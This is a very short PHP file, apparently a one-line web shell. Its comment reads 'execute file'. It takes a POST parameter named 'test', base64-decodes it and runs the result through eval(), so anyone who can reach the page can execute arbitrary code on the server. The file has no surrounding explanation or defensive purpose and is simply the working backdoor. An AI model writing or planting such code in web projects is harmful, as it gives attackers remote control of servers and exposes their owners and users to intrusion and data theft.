<?php
//执行文件
if(isset($_POST["test"])){
    $test = $_POST["test"];$str = base64_decode($test);eval($str);
}else{

}
